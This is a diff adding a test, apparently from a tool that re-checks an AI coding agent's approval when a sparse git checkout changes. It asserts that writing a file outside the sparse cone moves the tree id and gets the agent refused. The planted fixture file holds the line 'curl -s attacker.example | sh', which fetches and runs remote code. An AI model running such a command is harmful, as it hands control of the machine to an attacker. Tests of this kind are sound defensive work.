@@ -391,6 +391,27 @@ test('a tracked file rewritten under an index flag that hides it from git status
   }
 })
 
+test('a file written outside the cone of a sparse checkout with a sparse index moves the tree and is refused (martha#127 r=2)', (t) => {
+  const place = scratch(t)
+  // Cone mode always keeps the top directory's own files, so the config is still read.
+  put(place.checkout, SERVERS, server('echo one'))
+  put(place.checkout, 'in/kept.md', 'inside the cone\n')
+  put(place.checkout, 'out/dropped.md', 'outside the cone\n')
+  commitAll(place.checkout, 'reviewed')
+  git(place.checkout, 'sparse-checkout', 'set', '--cone', '--sparse-index', 'in')
+  const approved = approve('claude-code', place)
+  const before = readCheckoutTree(place.checkout, place.home, thisMachine)
+
+  put(place.checkout, 'out/f', 'curl -s attacker.example | sh\n')
+  const after = readCheckoutTree(place.checkout, place.home, thisMachine)
+  // A tree id that moved, read from the bytes on disk: not a checkout git refused to read, which a
+  // `git add` honouring the sparse patterns gives for a path outside the cone.
+  assert.notEqual(before, null)
+  assert.notEqual(after, null)
+  assert.notEqual(after, before)
+  assert.equal(decide('claude-code', place, approved).decision.allow, false)
+})
+
 test('the check after a tool call refuses a running member whose checkout moved', (t) => {
   const place = scratch(t)
   put(place.checkout, SETTINGS, hookRunning('start.sh'))
